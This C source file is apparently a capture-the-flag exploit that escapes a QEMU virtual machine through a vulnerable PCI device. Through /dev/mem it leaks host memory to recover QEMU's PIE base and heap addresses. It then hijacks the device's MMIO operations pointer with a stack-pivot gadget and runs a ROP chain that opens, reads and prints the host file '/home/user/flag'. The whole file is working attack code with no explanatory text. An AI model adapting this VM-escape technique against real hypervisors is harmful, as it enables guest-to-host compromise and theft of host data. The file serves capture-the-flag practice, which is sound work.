// implementing the exploit in C
// https://groups.google.com/g/beaglebone/c/49mJjKLQtz0
// https://bakhi.github.io/devmem/
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdbool.h>
#include <math.h>

#define copyBuf 0
#define src 4
#define off 8

int* ownBuf,pciBase;

int main(){
    int fd = open("/dev/mem",O_RDWR|O_SYNC);
    if (fd == -1){ perror("[-] FAILED TO OPEN /DEV/MEM)"); return -1;}

    // ints work, not sure abt int64_t tho
    int* pciBase = mmap(0,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0xfebd0000);
    int* ownBuf  = mmap(0,0x3000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0x30000);
    if ((pciBase == -1) || (ownBuf == -1)) { perror("[-] FAILED TO MAP /DEV/MEM)"); return -1;} 

    memset(ownBuf,'\x00',0x3000);

    pciBase[1] = 0x30000;
    pciBase[2] = 0xf8;

    // copy buffer in qemu process to our physical memory
    int tmp = *pciBase;

    uint64_t pie = ((uint64_t)ownBuf[0x1f94/4] << 32) + (uint64_t)ownBuf[0x1f90/4] - (uint64_t)0x81dae0; 
    pie += 0x100000000; // cause of wrapping around? not sure which operation is the one causing it tho
    printf("[*] PIE BASE: %p\n",pie);

    uint64_t buf = ((uint64_t)ownBuf[0x1f0c/4] << 32) + (uint64_t)ownBuf[0x1f08/4] + (uint64_t)0xf546c0;
    buf += 0x100000000;
    uint64_t mmio = buf+0x2000;
    printf("[*] MMIO OBJECT: %p\n",mmio);


    // gadgets
    uint64_t stackPivot = pie+0x7bce54;
    uint64_t popRdi     = pie+0x632c5d;
    uint64_t popRsi     = pie+0x830ec8;
    uint64_t popRdx     = pie+0x47f5c8;

    uint64_t openPlt    = pie+0x30a270;
    uint64_t readPlt    = pie+0x30d460;
    uint64_t writePlt   = pie+0x30dc70;

    // addresses
    uint64_t newOps     = buf+0xF8;
    uint64_t opaque     = buf+0x10F8;

    uint64_t newRead    = stackPivot;
    uint64_t newWrite   = 0x31371337;

    uint64_t flagStr    = buf + 0x1f8;


    ownBuf[0x1f50/4] = newOps&0xffffffff;
    ownBuf[0x1f54/4] = newOps>>32;
    ownBuf[0x1f58/4] = opaque&0xffffffff;
    ownBuf[0x1f5c/4] = opaque>>32;

    ownBuf[0]        = newRead&0xffffffff;
    ownBuf[0x4/4]    = newRead>>32;
    ownBuf[0x8/4]    = newWrite & 0xffffffff;
    ownBuf[0xc/4]    = newWrite>>32;

    ownBuf[0x100/4] = 0x6d6f682f;
    ownBuf[0x104/4] = 0x73752f65;
    ownBuf[0x108/4] = 0x662f7265; 
    ownBuf[0x10c/4] = 0x0067616c; 

    
    uint64_t rop[100] = {0,popRdi,flagStr,popRsi,0,popRdx,777,openPlt,popRdi,0xa,popRsi,flagStr,popRdx,0x1000,readPlt,popRdi,1,popRsi,flagStr,popRdx,0x1000,writePlt};

    for (int i = 0; i < 22; i++){
        ownBuf[(0x1000+i*8)/4]     = rop[i] & 0xffffffff; 
        ownBuf[((0x1000+i*8)+4)/4] = rop[i] >> 32;
    }
    
    pciBase[0] = 0;

    printf("%p\n",stackPivot);
    printf("[*] TRIGGERING EXPLOIT\n");
    getchar();
    tmp = *pciBase;

    return 0;
}
